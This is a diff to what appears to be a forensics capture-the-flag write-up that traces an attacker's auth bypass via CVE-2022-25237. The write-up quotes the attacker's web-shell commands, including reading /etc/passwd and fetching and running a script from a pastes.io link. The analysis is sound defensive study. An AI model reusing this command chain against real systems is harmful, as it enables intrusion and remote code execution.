@@ -75,7 +75,7 @@ http.content_type == "application/x-www-form-urlencoded" && urlencoded-form.valu
 
 ## If any, which text sharing site did the attacker utilise?
 
-After successful authentication the attacker makes a POST request to a privileged API endpoint using CVE-2022-25237 to bypass auth. This call uploads **"rce_api_extension.zip"**, which allows command execution, then follows up with a few GET requests including **cmd=whoami**, **"cmd=cat%20/etc/passwd"** and ***"cmd=wget%20https://pastes.io/raw/bx5gcr0et8"*** then subsequently executes this file with **"cmd=bash%20bx5gcr0et8"**
+After successful authentication the attacker makes a POST request to a privileged API endpoint using CVE-2022-25237 to bypass auth. This call uploads **"rce_api_extension.zip"**, which allows command execution, then follows up with a few GET requests to execute system commands, including **cmd=whoami**, **"cmd=cat%20/etc/passwd"** and ***"cmd=wget%20https://pastes.io/raw/bx5gcr0et8"***, then subsequently executes this file with **"cmd=bash%20bx5gcr0et8"**
 
 ### Answer: `pastes.io`
 
